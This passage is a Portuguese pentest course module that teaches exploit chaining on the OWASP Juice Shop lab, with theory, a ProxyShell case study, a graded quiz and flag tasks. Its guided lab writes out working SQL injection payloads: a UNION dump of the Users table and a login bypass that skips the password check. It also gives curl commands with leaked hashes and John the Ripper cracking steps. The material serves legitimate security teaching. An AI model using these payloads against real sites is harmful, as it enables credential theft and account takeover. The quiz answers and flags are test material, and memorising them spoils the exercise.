@@ -1,0 +1,887 @@
+---
+slug: mini-projeto-web
+track: trilha-4
+title: "Mini-projeto web: encadear falhas"
+prerequisites:
+  - sql-injection
+  - xss
+  - autenticacao-e-sessoes
+  - controle-de-acesso-e-idor
+  - command-injection-e-upload
+  - csrf-e-ssrf
+  - componentes-vulneraveis
+  - seguranca-de-apis-e-graphql
+lab: juice-shop
+tasks:
+  - slug: checkpoint-exfiltracao
+    title: "Checkpoint — Vazar a base de credenciais (SQLi + cripto)"
+    type: flag
+    prompt: "Quantas credenciais (e-mail + hash) você extraiu da tabela Users com o UNION, e qual a ÚNICA senha que caiu na quebra offline com a wordlist do Kali, no formato FLAG{total-senha}."
+    hint: "O total é o número de linhas com hash que o seu UNION trouxe de Users (não os produtos). A senha não se adivinha: ela cai quando você joga os hashes no john com a wordlist padrão; só uma das contas usa uma senha fraca o bastante para a lista pequena do Kali."
+    flag:
+      hash: "scrypt$16384$8$1$98f7dc7cc275a6cfd1b5885aaa49375add2be89f3fd87b7bfa555378f79633c8"
+      salt: "134076d14f4839d5e51187f3e7385fd4"
+  - slug: objetivo-tomada-de-conta
+    title: "Objetivo — Tomar a conta protegida por 2FA (a cadeia inteira)"
+    type: flag
+    prompt: "A parte local do e-mail da vítima cuja conta protegida por segundo fator você tomou, e os 8 PRIMEIROS caracteres da semente TOTP que você roubou por SQL injection, no formato FLAG{vitima-8chars}."
+    hint: "Só um usuário do Juice Shop tem uma semente de 2FA não vazia — descubra quem puxando a coluna totpSecret no seu UNION. A parte local é o que vem antes do @. Os 8 primeiros caracteres da semente são o começo da string Base32 que você exfiltrou (as maiúsculas, exatamente como vieram)."
+    flag:
+      hash: "scrypt$16384$8$1$d36f34021ed8ac59ea7f3c79397a0c334d44ef9f2501949aef9e6ad436858c98"
+      salt: "11ffdaf2c3b53d95311f8188e61314d7"
+  - slug: quiz-final
+    title: "Quiz — Encadear falhas"
+    type: quiz
+    passPercent: 70
+    questions:
+      - question: "O que é um exploit chain (cadeia de exploração) e por que ele importa?"
+        options:
+          - "Rodar o mesmo exploit várias vezes até funcionar"
+          - "Encadear várias vulnerabilidades, cada uma resolvendo uma pré-condição da próxima, de modo que falhas de impacto baixo ou médio, somadas, alcançam um objetivo que nenhuma delas atingiria sozinha"
+          - "Um exploit que ataca vários alvos ao mesmo tempo"
+          - "Uma lista de exploits ordenada por data"
+        answer: 1
+        explanation: "Cadear é usar a SAÍDA de uma falha como ENTRADA da seguinte. O impacto não é a soma das partes: três bugs medianos podem dar controle total, como no ProxyShell. Repetir o mesmo exploit ou atacar vários alvos é outra coisa."
+      - question: "No mini-projeto, por que a quebra offline do hash do admin NÃO era necessária para assumir uma conta?"
+        options:
+          - "Porque o hash do admin era fácil e caiu na wordlist"
+          - "Porque o atacante contorna o elo difícil: o SQL injection no login ignora a verificação de senha, então a força do hash deixa de importar para entrar"
+          - "Porque o admin não tinha senha"
+          - "Porque o Juice Shop não usa hash"
+        answer: 1
+        explanation: "A graça do encadeamento é rotear em volta do que é forte. O hash do admin resistiu à wordlist pequena, mas o bypass de login (' OR true--) não precisa da senha. Uma defesa forte perde o valor se outro elo abre o mesmo caminho."
+      - question: "A semente TOTP do wurstbrot foi roubada por SQL injection. Por que isso derrota o segundo fator (2FA)?"
+        options:
+          - "Porque o 2FA do wurstbrot estava desligado"
+          - "Porque, com a semente, o atacante calcula o mesmo código de uso único que o app do usuário geraria (TOTP é HMAC-SHA1 da semente com o tempo); o segredo compartilhado deixou de ser secreto"
+          - "Porque o código de 6 dígitos é fácil de adivinhar"
+          - "Porque o SQL injection desliga o 2FA no servidor"
+        answer: 1
+        explanation: "TOTP é determinístico: mesma semente + mesmo instante = mesmo código. Se a semente vaza, o atacante vira um gerador de OTP válido. O 2FA protege contra senha roubada, não contra o roubo do próprio segredo da semente."
+      - question: "Guardar a semente TOTP em texto recuperável no banco é um problema porque..."
+        options:
+          - "deixa o login mais lento"
+          - "um vazamento do banco (por SQLi, backup exposto, insider) entrega o segundo fator de todos os usuários de uma vez, anulando o 2FA sem que ninguém perceba"
+          - "o TOTP para de funcionar"
+          - "o Base32 é inseguro"
+        answer: 1
+        explanation: "A semente é um segredo de longo prazo. Se o banco cai, todas as sementes caem com ele e os códigos passam a ser previsíveis para o atacante. É o 'Unsafe Secret Storage' que dá nome ao desafio do Juice Shop."
+      - question: "Por que uma query parametrizada (prepared statement) corta DOIS caminhos da árvore de ataque de uma vez?"
+        options:
+          - "Porque criptografa o banco"
+          - "Porque separa código de dado: a entrada do usuário nunca é interpretada como SQL, então nem o bypass no login nem o UNION na busca começam — e sem SQLi, os elos seguintes ficam sem pré-condição"
+          - "Porque esconde a tabela Users"
+          - "Porque bloqueia o IP do atacante"
+        answer: 1
+        explanation: "As duas injeções (login e busca) são o mesmo defeito: concatenar entrada na query. A query parametrizada fecha a classe inteira na origem. Como os elos seguintes dependem do SQLi, cortar a raiz derruba a cadeia antes de ela andar."
+      - question: "O que a árvore de ataque (attack tree) deixa claro sobre a defesa?"
+        options:
+          - "Que basta proteger o elo mais caro"
+          - "Que, se o objetivo é um nó OU (vários caminhos independentes levam a ele), fechar um ramo não basta: o atacante usa outro. Fechar a árvore exige cobrir todos os caminhos"
+          - "Que ataques só têm um caminho possível"
+          - "Que a defesa é sempre impossível"
+        answer: 1
+        explanation: "Modelar o ataque como árvore mostra os caminhos alternativos. Com um nó OU no topo, um ramo aberto já vence. Por isso defesa em profundidade: cada camada corta ramos, e a meta é não deixar nenhum caminho inteiro em aberto."
+      - question: "Num relatório de pentest, por que o caminho de ataque (attack path) encadeado vale mais do que uma lista solta de bugs?"
+        options:
+          - "Porque é mais curto"
+          - "Porque mostra o impacto real: 'um SQLi de severidade média' soa tolerável, mas 'este SQLi leva, em quatro passos, à tomada de uma conta com 2FA' prioriza a correção e explica o risco ao negócio"
+          - "Porque esconde os bugs menores"
+          - "Porque dispensa as evidências"
+        answer: 1
+        explanation: "Severidade isolada engana. O caminho encadeado traduz bugs em consequência (tomada de conta, vazamento da base) e ajuda o time a priorizar. Documentar pré-condição, passo e evidência de cada elo é o produto do mini-projeto."
+      - question: "Qual afirmação sobre encadear falhas é a correta?"
+        options:
+          - "Só vale a pena encadear vulnerabilidades críticas entre si"
+          - "Falhas de baixa severidade (um vazamento de id, uma semente mal guardada, um campo que o servidor confia) costumam ser justamente os elos que transformam um bug médio em comprometimento total"
+          - "Encadear é raro no mundo real"
+          - "Uma cadeia é tão forte quanto o seu elo mais forte"
+        answer: 1
+        explanation: "O atacante pensa em caminhos, não em notas de CVSS. Bugs 'pequenos' são o cimento das cadeias — e uma cadeia é tão forte quanto o elo mais FRACO que você conseguir alinhar. Daí a atenção a detalhes que, isolados, pareceriam inofensivos."
+glossary:
+  - term: exploit chain
+    definition: "Cadeia de exploração: uma sequência de vulnerabilidades encadeadas em que a saída (o que cada falha concede) satisfaz a pré-condição da próxima, de modo que falhas de impacto baixo ou médio, somadas, alcançam um objetivo que nenhuma delas atingiria sozinha."
+  - term: attack tree
+    definition: "Árvore de ataque: representação em árvore de como um objetivo de ataque pode ser alcançado, com o objetivo na raiz e os caminhos alternativos como ramos (nós OU) ou etapas obrigatórias (nós E). Ajuda a ver os múltiplos caminhos e onde cada defesa corta."
+  - term: Base32
+    definition: "Base32: codificação que representa dados binários usando 32 caracteres ASCII (A–Z e 2–7). É comum para segredos que uma pessoa digita ou lê, como a semente de TOTP, por evitar caracteres ambíguos e ser insensível a maiúsculas/minúsculas."
+---
+
+import cadeiaDeAtaque from "./img/cadeia-de-ataque.svg";
+import arvoreDeAtaque from "./img/arvore-de-ataque.svg";
+
+## 1. Abertura — o que você vai aprender e por quê
+
+Até aqui, cada módulo da Trilha 4 te deu **uma** ferramenta: SQL injection no 4.2,
+quebra de autenticação no 4.4, controle de acesso quebrado no 4.5, e assim por
+diante. Um pentester de verdade, porém, raramente ganha a máquina com um golpe
+só. Ele ganha **encadeando**: um vazamento aparentemente bobo abre uma injeção, a
+injeção entrega um segredo, o segredo derruba o segundo fator, e o que parecia um
+punhado de falhas medianas vira a tomada completa de uma conta. Isto é um
+<GlossaryTerm term="exploit chain">exploit chain</GlossaryTerm> (cadeia de
+exploração), e é o assunto deste mini-projeto.
+
+Este é um módulo de **consolidação**: você não aprende uma falha nova, você aprende
+a **pensar em caminhos**. O objetivo é único e concreto — partir de um visitante
+anônimo do Juice Shop e chegar a **assumir a conta de um usuário protegido por
+autenticação em dois fatores** —, e para chegar lá você vai costurar, numa ordem
+que importa, três técnicas que já viu: SQL injection (4.2), a lógica da
+autenticação e do 2FA (4.4) e a exposição de dados sensíveis por API (4.9). No fim,
+você vai **documentar o caminho de ataque** como num relatório — porque descrever a
+cadeia é tão parte do ofício quanto executá-la.
+
+**O que você vai aprender:**
+
+- O que é um exploit chain e por que o impacto de uma cadeia **não é a soma** das
+  partes, e sim o produto: três bugs médios podem dar controle total.
+- A pensar em **pré-condição e pós-condição** de cada elo — o que preciso ter para
+  dar este passo, e o que este passo me entrega para o próximo.
+- A encadear, no Juice Shop, uma cadeia real: vazar a base de credenciais por
+  <GlossaryTerm term="union-based SQL injection">UNION SQL injection</GlossaryTerm>,
+  tentar a <GlossaryTerm term="password cracking">quebra offline</GlossaryTerm> das
+  senhas, roubar a semente de <GlossaryTerm term="TOTP">TOTP</GlossaryTerm> de uma
+  vítima por injeção e **derrotar o segundo fator** calculando o código você mesmo.
+- A desenhar o ataque como uma <GlossaryTerm term="attack tree">attack tree</GlossaryTerm>
+  (árvore de ataque) e a entender, por ela, por que a **defesa em profundidade** é a
+  resposta certa: **quebrar um único elo** derruba a cadeia inteira.
+- A **documentar o caminho de ataque** (attack path) de um jeito que prioriza a
+  correção e explica o risco ao negócio.
+
+**Pré-requisitos relembrados.** Este módulo cobra o que a trilha construiu, em uma
+linha cada: **4.2 (SQL injection)** — montar um `UNION SELECT` e entender por que o
+banco interpreta a entrada como comando; **4.3 (XSS)** — como o cliente executa o
+que o servidor devolve; **4.4 (Autenticação e sessões)** — login, token e a ideia
+de segundo fator; **4.5 (Broken Access Control e IDOR)** — trocar uma referência
+para alcançar o objeto de outro; **4.6 (Command injection e upload)** — como uma
+entrada vira execução; **4.7 (CSRF e SSRF)** — pedidos forjados e alcance interno;
+**4.8 (Componentes vulneráveis)** — como um bug de biblioteca vira falha da
+aplicação; **4.9 (APIs e GraphQL)** — como APIs expõem dados em excesso e o conceito
+de <GlossaryTerm term="BOLA">BOLA</GlossaryTerm>. Se algum desses soar novo, volte
+ao módulo antes de seguir.
+
+<Callout variant="ethics" title="Só em ambiente autorizado">
+Todo este mini-projeto roda **exclusivamente** contra o laboratório local
+`juice-shop`, que existe para ser atacado. Encadear falhas para tomar a conta de
+alguém, fora de um escopo autorizado por escrito, é invasão de dispositivo e acesso
+não autorizado — crime no Brasil (art. 154-A do Código Penal, visto no 1.4). A
+técnica é idêntica; o que separa o pentester do criminoso é a **autorização**.
+</Callout>
+
+## 2. Teoria aprofundada — o conceito por dentro
+
+### 2.1 Por que encadear: o impacto é multiplicativo, não aditivo
+
+Pegue três vulnerabilidades e dê a cada uma uma nota de gravidade. Isoladas, talvez
+sejam todas "médias": um SQL injection que lê dados mas não escreve; um segredo de
+2FA guardado de um jeito ruim; um login que confia demais na entrada. Um checklist
+de segurança marcaria três itens amarelos e seguiria em frente.
+
+O atacante não lê o checklist; ele procura um **caminho**. E quando ele percebe que
+a saída de uma falha é exatamente a entrada que a próxima precisa, as três médias se
+combinam num resultado que nenhuma delas produziria só. A injeção entrega a semente
+de 2FA; a semente derrota o segundo fator; o login frouxo o deixa pular a senha. O
+resultado — tomar uma conta protegida — é **crítico**, mesmo que cada peça fosse
+média. É isto que se quer dizer com "o impacto de uma cadeia é multiplicativo": você
+não soma gravidades, você multiplica **probabilidades de sucesso de cada passo** até
+o objetivo.
+
+A lição defensiva nasce aqui e volta na seção 8: se o impacto vem da cadeia inteira,
+**interromper qualquer elo** zera o impacto. Um único passo que falhe, e o atacante
+fica preso no meio do caminho.
+
+### 2.2 Pré-condição e pós-condição: o vocabulário da cadeia
+
+A ferramenta mental para encadear é simples e vem da engenharia: descreva cada elo
+por duas coisas.
+
+- **Pré-condição:** o que você precisa **ter** para executar este passo. (Ex.: "para
+  calcular o OTP, preciso da semente TOTP da vítima.")
+- **Pós-condição:** o que este passo **te entrega**. (Ex.: "o UNION injection me
+  entrega a coluna `totpSecret` de todos os usuários.")
+
+Uma cadeia é válida quando a **pós-condição de um elo satisfaz a pré-condição do
+seguinte**. Montar o ataque é, literalmente, encaixar essas peças: começo do que
+tenho como anônimo (nada) e procuro um primeiro elo cuja pré-condição eu já cumpra;
+a pós-condição dele me dá material para o próximo; repito até a pós-condição ser o
+objetivo. Quando um encaixe não existe, você tem uma **lacuna** — e é aí que entra a
+criatividade: achar um elo alternativo, ou um bug novo, que preencha a lacuna.
+
+<Figure
+  src={cadeiaDeAtaque}
+  alt="Diagrama de seis estágios do ataque. 1, atacante anônimo sem conta. 2, SQL injection UNION na busca vaza a tabela Users com 24 credenciais em MD5. 3, quebra offline com o John: só a senha fraca da conta demo cai, o hash do admin resiste, esse caminho trava. 4, dois SQL injection que se somam: um puxa a coluna totpSecret e rouba a semente de dois fatores do wurstbrot, outro no login com wurstbrot aspa traço traço ignora a senha e cai no portão do segundo fator. 5, o código de uso único é calculado da semente roubada por HMAC-SHA1. 6, a sessão de wurstbrot é tomada, senha e segundo fator derrotados. Uma faixa verde lembra que quebrar qualquer elo, com query parametrizada, hash salgado, semente protegida ou limite de OTP, derruba a cadeia inteira."
+  caption="A cadeia do mini-projeto em seis elos. Repare como a pós-condição de cada passo (o que ele entrega) vira a pré-condição do próximo — e como o caminho desvia do elo que trava (a quebra do hash forte) usando o bypass de login."
+/>
+
+### 2.3 A escada de acesso: de anônimo a dono da conta
+
+Encadear quase sempre significa **subir uma escada de privilégio**, degrau por
+degrau. No mundo web, os degraus costumam ser:
+
+1. **Anônimo** — você só vê o que é público.
+2. **Usuário comum autenticado** — você tem uma conta e um token.
+3. **Outro usuário** (<GlossaryTerm term="horizontal privilege escalation">escalonamento
+   horizontal</GlossaryTerm>) — você alcança dados ou a conta de outra pessoa do
+   mesmo nível.
+4. **Administrador** (<GlossaryTerm term="vertical privilege escalation">escalonamento
+   vertical</GlossaryTerm>) — você sobe de papel.
+
+Cada falha que você já estudou move você entre degraus: um SQL injection no login
+pula direto de anônimo para admin; um <GlossaryTerm term="IDOR">IDOR</GlossaryTerm>
+anda de lado, de um usuário para outro; um roubo de semente de 2FA te deixa **virar**
+uma vítima específica. A cadeia deste módulo combina esses movimentos: ela não sobe
+em linha reta, ela faz uma manobra — rouba um segredo, ignora uma senha, calcula um
+código — para aterrissar na conta exata que quer.
+
+### 2.4 CVSS, severidade e a armadilha de avaliar bugs isolados
+
+O <GlossaryTerm term="CVSS">CVSS</GlossaryTerm> (o padrão de pontuar gravidade de
+vulnerabilidades, visto no 4.1) nota **uma** falha de cada vez. Isso cria uma
+armadilha real: uma vulnerabilidade pode receber nota baixa porque, **sozinha**, ela
+exige pré-condições difíceis — "precisa de privilégios altos", "o impacto é só leitura".
+O avaliador marca "baixa" e segue.
+
+Só que o atacante **fornece** essas pré-condições com outro elo. O exemplo clássico
+você verá na seção 4: uma das três falhas do ProxyShell foi classificada pela própria
+Microsoft como de exploração "menos provável", porque sozinha ela pedia privilégios
+que um anônimo não tem. Encadeada depois das outras duas — que davam exatamente esses
+privilégios —, ela fechou um dos ataques mais devastadores da década. A moral: **nota
+de bug isolado engana**. Quem pensa em cadeia pergunta sempre "e se o atacante já
+tiver o degrau anterior?".
+
+### 2.5 Pensar como árvore: muitos caminhos, um objetivo
+
+Raramente há **um só** caminho até o objetivo. Normalmente há vários, e o atacante
+toma o mais barato. A ferramenta para enxergar isso é a
+<GlossaryTerm term="attack tree">attack tree</GlossaryTerm> (árvore de ataque): põe-se
+o objetivo na raiz e, abaixo, os caminhos que levam a ele. Se qualquer um dos
+caminhos basta, o nó é um **OU**; se um passo exige vários sub-passos juntos, é um
+**E**.
+
+No nosso lab, "assumir uma conta privilegiada" é um nó **OU**: dá para chegar lá
+tomando o **admin** (via um bypass de SQL injection no login, que você explora na
+seção 6) **ou** tomando o **wurstbrot** (a cadeia do 2FA, da seção 5). Dois caminhos
+independentes, mesmo objetivo. Essa figura mental é o que, na defesa, mostra por que
+tapar um buraco não basta: enquanto **um** ramo inteiro estiver aberto, o atacante
+vence. Guardaremos a árvore para a seção 8.
+
+## 3. Como o ataque funciona — a mecânica
+
+Encadear tem um método, e ele cabe em quatro movimentos que se repetem: **mapear** a
+superfície, **achar um primeiro elo** que você já consegue disparar, **usar a
+pós-condição** dele para habilitar o próximo, e **repetir** até o objetivo. Vamos ver
+a mecânica de cada técnica que a nossa cadeia usa, para você não decorar comandos e
+sim entender por que cada um funciona.
+
+### 3.1 O mesmo SQL injection, servindo a dois elos
+
+O Juice Shop monta a busca de produtos concatenando a sua entrada numa query SQL. A
+query original é algo como:
+
+```sql
+SELECT * FROM Products
+WHERE ((name LIKE '%SUA_BUSCA%' OR description LIKE '%SUA_BUSCA%')
+       AND deletedAt IS NULL) ORDER BY name
+```
+
+Como você viu no 4.2, se a aplicação não parametriza, a sua entrada pode **fechar**
+as aspas e os parênteses e emendar um `UNION SELECT`, que cola **outra** consulta na
+mesma resposta. A busca devolve 9 colunas (confirme você mesmo na seção 5), então um
+`UNION` precisa de 9 colunas também. Colocando `email` e `password` em duas delas e
+lendo da tabela `Users`, a resposta da busca passa a trazer as credenciais. Essa é a
+**pós-condição do elo 1**: a base de usuários inteira.
+
+O detalhe que separa quem sabe o básico de quem encadeia: você escolhe **quais
+colunas** puxar. Trocar `password` por `totpSecret` no mesmo `UNION` exfiltra as
+sementes de segundo fator. É o mesmo bug, mirando um dado diferente — e é esse ajuste
+fino que vira o elo decisivo da cadeia.
+
+O **segundo uso** do mesmo tipo de falha está no **login**. A query de autenticação é
+parecida com:
+
+```sql
+SELECT * FROM Users WHERE email = 'ENTRADA' AND password = '...' AND deletedAt IS NULL
+```
+
+Se você manda como e-mail `wurstbrot@juice-sh.op'--`, a aspa fecha a string e o `--`
+**comenta** o resto da linha, inclusive a checagem de senha. A query vira "selecione o
+usuário com este e-mail", e o servidor loga você como ele **sem conferir a senha**.
+Pós-condição: você é tratado como aquela conta — pulando o elo da senha de vez.
+
+### 3.2 Quebra offline de hash: por que o MD5 sem sal cai (e por que às vezes não)
+
+Com a base vazada, você tem e-mails e **hashes** de senha. O Juice Shop guarda as
+senhas como <GlossaryTerm term="MD5">MD5</GlossaryTerm> **sem sal** — exatamente o
+anti-padrão que a Trilha 3 condena. MD5 é rápido e determinístico: `MD5("demo")` dá
+sempre o mesmo valor. Sem <GlossaryTerm term="salt">sal</GlossaryTerm> (um valor
+aleatório misturado a cada senha antes do hash), duas pessoas com a mesma senha têm o
+mesmo hash, e nada atrapalha um ataque de dicionário.
+
+A <GlossaryTerm term="password cracking">quebra offline</GlossaryTerm> funciona assim:
+o atacante pega uma lista de palavras (wordlist), calcula o hash de cada uma e compara
+com os hashes roubados. Bateu, achou a senha. Ferramentas como o **John the Ripper**
+fazem isso a milhões de tentativas por segundo. Senhas fracas caem num piscar; senhas
+fortes, ou ausentes da wordlist, **resistem**. Guarde esse "resistem": é ele que, no
+lab, obriga você a desviar do caminho óbvio (quebrar o hash do admin) e procurar outro
+elo. Encadear é, muitas vezes, saber **quando desistir de um elo** e rotear em volta.
+
+### 3.3 Derrotar o segundo fator com a semente roubada
+
+O **TOTP** (Time-based One-Time Password, a senha de uso único por tempo que o seu app
+autenticador gera) parece mágico, mas é determinístico. O servidor e o app
+compartilham um segredo — a **semente** (seed), uma string em
+<GlossaryTerm term="Base32">Base32</GlossaryTerm>. A cada 30 segundos, os dois
+calculam o mesmo número de 6 dígitos com a fórmula do padrão (RFC 6238):
+
+```
+código = HMAC-SHA1(semente, janela_de_30s) → truncado em 6 dígitos
+```
+
+A segurança inteira depende de a **semente ser secreta**. Se ela vaza — e no nosso
+lab ela vaza por SQL injection —, o atacante calcula o **mesmo** código que o app da
+vítima mostraria **naquele instante**. Ele vira um gerador legítimo de OTP. O segundo
+fator, que deveria exigir "algo que você tem" (o celular), passa a exigir só "algo que
+o atacante também tem" (a semente). É isto que fecha a cadeia: a senha foi pulada pelo
+SQLi do login; o 2FA, derrotado pela semente roubada.
+
+## 4. Casos reais — o que aconteceu no mundo
+
+Encadear falhas não é um exercício de laboratório: é como os ataques mais graves de
+verdade acontecem. O exemplo canônico, verificado em fonte primária, é o **ProxyShell**.
+
+### ProxyShell: três CVEs que, juntas, derrubaram o Microsoft Exchange (2021)
+
+Em **abril de 2021**, no concurso **Pwn2Own Vancouver**, o pesquisador taiwanês Orange
+Tsai, da equipe DEVCORE, demonstrou uma tomada completa do Microsoft Exchange Server e
+levou **US$ 200 mil** pelo feito. Ele batizou a cadeia de **ProxyShell**. Não era um
+bug: eram **três**, encadeados.
+
+- **CVE-2021-34473** — "Microsoft Exchange Server Remote Code Execution Vulnerability".
+  Uma confusão de caminho (path confusion) **pré-autenticação** que permite alcançar
+  URLs internas do servidor burlando o controle de acesso. É o elo que abre a porta
+  para um anônimo. Publicada em **14 de julho de 2021**.
+- **CVE-2021-34523** — "Microsoft Exchange Server Elevation of Privilege Vulnerability".
+  Uma elevação de privilégio no backend de PowerShell do Exchange que deixa o atacante
+  **se passar por qualquer usuário**, inclusive o administrador. Publicada em
+  **14 de julho de 2021**.
+- **CVE-2021-31207** — "Microsoft Exchange Server Security Feature Bypass Vulnerability".
+  Uma escrita de arquivo arbitrária **pós-autenticação** que, abusada, grava um
+  <GlossaryTerm term="web shell">web shell</GlossaryTerm> e leva a execução de código.
+  Publicada em **11 de maio de 2021**.
+
+Isoladas, elas pareciam limitadas — a CVE-2021-31207, por exigir privilégios altos,
+chegou a ser classificada como de exploração "menos provável". Mas **a pré-condição de
+privilégio que ela pedia era exatamente a pós-condição das outras duas**. Encadeadas,
+nas palavras do próprio write-up, *"an unauthenticated attacker can execute arbitrary
+commands on Microsoft Exchange Server through an exposed 443 port"* — um atacante **sem
+nenhuma credencial** executa comandos no servidor, só pela porta 443.
+
+O estrago foi em massa. Em **21 de agosto de 2021**, a CISA (a agência de
+cibersegurança dos EUA) emitiu um alerta **urgente** pedindo correção imediata: grupos
+já varriam a internet atrás de servidores vulneráveis e o ransomware **LockFile** os
+explorava. A correção completa estava nas atualizações de maio e julho de 2021 da
+Microsoft — mas muitas organizações não haviam aplicado.
+
+- **Lição:** o ProxyShell é a nossa tese em escala global. Nenhuma das três falhas,
+  sozinha, dava controle total; a **cadeia** dava. E note o paralelo exato com o lab:
+  assim como a CVE-2021-31207 "média" virou crítica ao ganhar a pré-condição das
+  outras, a nossa semente de 2FA "exposta" só vira tomada de conta quando somada ao
+  bypass do login. Fontes primárias: os registros oficiais
+  [CVE-2021-34473](https://www.cve.org/CVERecord?id=CVE-2021-34473),
+  [CVE-2021-34523](https://www.cve.org/CVERecord?id=CVE-2021-34523) e
+  [CVE-2021-31207](https://www.cve.org/CVERecord?id=CVE-2021-31207); o write-up do
+  pesquisador,
+  [From Pwn2Own 2021: A New Attack Surface on Microsoft Exchange — ProxyShell (ZDI, 17/08/2021)](https://www.thezdi.com/blog/2021/8/17/from-pwn2own-2021-a-new-attack-surface-on-microsoft-exchange-proxyshell).
+
+## 5. Mãos à obra — o laboratório guiado
+
+**Objetivo do mini-projeto:** partir de um visitante anônimo e, encadeando falhas,
+**tomar a conta de `wurstbrot@juice-sh.op`** — um usuário protegido por autenticação em
+dois fatores — provando pelo caminho que você vazou a base de credenciais inteira. Há
+dois marcos: um **checkpoint** (vazar e quebrar credenciais) e o **objetivo final** (a
+tomada da conta com 2FA). Cada um rende uma flag.
+
+O laboratório é o **`juice-shop`**: o Kali e o OWASP Juice Shop na mesma rede interna.
+De dentro do Kali, o alvo responde em `http://juice-shop:3000/`. Você trabalha pelo
+terminal do Kali, com `curl`, `python3` e o `john` — tudo que a attack box já traz.
+
+<Callout variant="warning" title="Um laboratório por vez">
+Este lab sobe o Kali e o Juice Shop. Se outro lab estiver no ar, o botão vira
+**Trocar para este lab**. Feche o que não estiver usando antes de subir.
+</Callout>
+
+### 5.1 Subir o lab e preparar a bancada (passo a passo)
+
+1. No painel **Laboratório**, no topo desta página, clique em **Iniciar**. Se faltarem
+   imagens, rode no terminal do WSL `scripts/lab.sh pull juice-shop` (único momento com
+   internet) e tente de novo. Pela linha de comando, a alternativa para ligar é
+   `scripts/lab.sh up juice-shop`.
+2. Quando o desktop do Kali aparecer, abra um terminal e crie a pasta de evidências —
+   um mini-projeto se documenta desde o primeiro comando:
+
+```console
+$ umask 077
+$ mkdir -p ~/engajamentos/lab-4.10_juice-shop/evidencias
+$ cd ~/engajamentos/lab-4.10_juice-shop/evidencias
+```
+
+3. Confirme o alvo e anote a versão (parte do registro de evidências):
+
+```console
+$ curl -s http://juice-shop:3000/rest/admin/application-version
+{"version":"20.2.0"}
+```
+
+### 5.2 A carta de autorização do exercício
+
+<Callout variant="info" title="Autorização — exercício 4.10 (laboratório local)">
+**Ativo autorizado:** a aplicação `http://juice-shop:3000/` do lab `juice-shop`.
+
+**Técnicas autorizadas:** SQL injection (na busca e no login), quebra offline de
+hashes vazados, exfiltração de segredos de 2FA e cálculo de OTP, tudo contra o Juice
+Shop, pelo terminal do Kali, com o fim de encadear as falhas e documentar o caminho.
+
+**Fora do escopo:** qualquer outro host (o `guacd`, o próprio Kali) e qualquer sistema
+fora do laboratório. Nada de testar estas técnicas em sites reais.
+</Callout>
+
+### 5.3 Elo 1 — Vazar a base de credenciais (guiado → desafio)
+
+**Cenário:** você é anônimo. O primeiro elo é um `UNION` SQL injection na busca de
+produtos, que você viu no 4.2 — aqui ele serve para **exfiltrar a tabela `Users`
+inteira**.
+
+Comece confirmando quantas colunas a busca devolve (um `UNION` precisa casar esse
+número):
+
+```console
+$ curl -s "http://juice-shop:3000/rest/products/search?q=apple" \
+    | python3 -c 'import sys,json; d=json.load(sys.stdin)["data"]; print("colunas:", list(d[0].keys()))'
+colunas: ['id', 'name', 'description', 'price', 'deluxePrice', 'image', 'createdAt', 'updatedAt', 'deletedAt']
+```
+
+São **9 colunas**. Agora o passo guiado: um `UNION SELECT` com 9 campos, pondo `email`
+e `password` em dois deles e lendo de `Users`. A carga (já URL-encodada abaixo) fecha a
+string e os parênteses da query original e emenda a sua:
+
+```text
+qwert')) UNION SELECT id,email,password,'4','5','6','7','8','9' FROM Users--
+```
+
+```console
+$ curl -s "http://juice-shop:3000/rest/products/search?q=qwert%27%29%29%20UNION%20SELECT%20id%2Cemail%2Cpassword%2C%274%27%2C%275%27%2C%276%27%2C%277%27%2C%278%27%2C%279%27%20FROM%20Users--" \
+    | python3 -c '
+import sys, json
+rows = json.load(sys.stdin)["data"]
+creds = [(r["name"], r["description"]) for r in rows if len(str(r.get("description",""))) == 32]
+print("credenciais vazadas:", len(creds))
+for email, md5 in creds[:4]:
+    print("  ", email, md5)
+'
+credenciais vazadas: 24
+   admin@juice-sh.op 0192023a7bbd73250516f069df18b500
+   jim@juice-sh.op e541ca7ecf72b8d1286474fc613e5e45
+   bender@juice-sh.op 0c36e517e3fa95aabf1bbffc6744a4ef
+   bjoern.kimminich@gmail.com 6edd9d726cbdc873c539e41ae8757b8c
+```
+
+Como você injetou `email` no campo `name` e `password` no campo `description`, cada
+"produto" falso é na verdade uma credencial. **24 contas**, com os hashes MD5 à mostra.
+Esta é a pós-condição do elo 1.
+
+<Hint title="Dica — salve o dump para os próximos elos">
+Grave os hashes num arquivo (um por linha) e a tabela completa (e-mail + hash) em
+outro. Você vai precisar dos hashes para o `john` no elo 2 e da lista de e-mails para
+achar a vítima do 2FA no elo 3. Um `python3` lendo o JSON e escrevendo em
+`hashes.txt`/`users.txt` resolve.
+</Hint>
+
+### 5.4 Elo 2 — Quebra offline e o checkpoint (desafio)
+
+**Cenário:** você tem 24 hashes. O reflexo é quebrá-los offline e usar as senhas. Vá em
+frente — mas repare **quais** caem e quais resistem, porque isso decide o seu próximo
+movimento.
+
+**Seu objetivo (checkpoint):** descobrir **quantas** credenciais você vazou e **qual**
+senha cai na quebra offline com a wordlist do Kali. A flag é `FLAG{total-senha}`.
+
+O Juice Shop guarda MD5 **sem sal** — ou seja, um ataque de dicionário direto funciona.
+O `john` já vem no Kali.
+
+<Hint title="Dica 1 — rodar o John">
+O formato é `raw-md5`. Use a wordlist padrão do Kali (`/usr/share/john/password.lst`)
+com as regras de mutação (`--rules`). Algo como
+`john --format=raw-md5 --wordlist=/usr/share/john/password.lst --rules hashes.txt`, e
+depois `john --format=raw-md5 --show hashes.txt` para ver o que caiu.
+</Hint>
+
+<Hint title="Dica 2 — ligar o hash quebrado ao e-mail">
+O `john` te dá o hash e a senha. Para saber de **quem** é, cruze esse hash com o seu
+`users.txt` (e-mail + hash). Só uma conta usa uma senha fraca o bastante para a lista
+pequena do Kali — é a senha que entra na flag. O "total" é o número de credenciais do
+elo 1.
+</Hint>
+
+<Solution title="Solução do checkpoint">
+Quebra offline com o John the Ripper (saída real do lab):
+
+```console
+$ john --format=raw-md5 --wordlist=/usr/share/john/password.lst --rules hashes.txt
+Using default input encoding: UTF-8
+Loaded 24 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
+demo             (?)
+1g 0:00:00:00 DONE ... (1 password hash cracked, 23 left)
+
+$ john --format=raw-md5 --show hashes.txt
+?:demo
+
+1 password hash cracked, 23 left
+```
+
+Só **uma** senha cai: `demo`. Cruzando o hash dela (`fe01ce2a7fbac8fafaed7c982a04e229`)
+com o seu `users.txt`, ela pertence à conta de e-mail `demo`. Os outros 23 hashes —
